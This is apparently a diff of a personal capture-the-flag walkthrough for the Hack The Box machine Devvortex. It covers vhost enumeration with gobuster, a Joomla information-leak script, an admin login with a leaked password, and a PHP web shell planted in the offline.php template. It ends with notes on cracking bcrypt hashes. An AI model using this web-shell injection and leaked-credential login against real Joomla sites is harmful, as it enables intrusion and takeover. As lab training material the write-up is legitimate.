@@ -1,10 +1,38 @@
-#add domain devvortex.htb to hosts dns file
+# Devvortex
 
+```bash
+Visit machine ip: 10.10.11.242
+Follow a redirect to: devvortex.htb but its not working
+```
+
+```bash
+add domain devvortex.htb to hosts dns file
+nano /etc/hosts
+10.10.11.242	devvortex.htb
+```
+
+```bash
+only html/css/js static code
+nmap nothing than 80 and ssh, cant detect vulns working
+```
+
+```bash
+Scan for other hidden vhost domains
 https://github.com/OJ/gobuster/releases
 
 ./gobuster vhost -u devvortex.htb -t 50 -w ../subdomains-top1million-5000.txt --append-domain
 
-dev.devvortex.htb
+Found: dev.devvortex.htb
+```
+
+```bash
+add domain dev.devvortex.htb to hosts dns file
+nano /etc/hosts
+10.10.11.242	dev.devvortex.htb devvortex.htb
+```
+
+```bash
+on http://dev.devvortex.htb/administrator/ Joomla detected!
 
 gem install httpx
 gem install docopt
@@ -29,8 +57,15 @@ ruby joomla.rb http://dev.devvortex.htb
 	DB name: joomla
 	DB prefix: sd4fg_
 	DB encryption 0
+```
 
-http://dev.devvortex.htb/administrator
+```bash
+Login into http://dev.devvortex.htb/administrator/ as:
+	lewis
+	P4ntherg0t1n5r3c0n##
+```
+
+```bash
 
 Edit any php template file, example: offline.php
 	if (isset($_GET["cmd"])){
@@ -59,3 +94,9 @@ Edit any php template file, example: offline.php
 
 	Crack joomla password (bcrypt)
 	https://hashcat.net/forum/thread-10645.html
+```
+
+```bash
+try get a better shell
+
+```
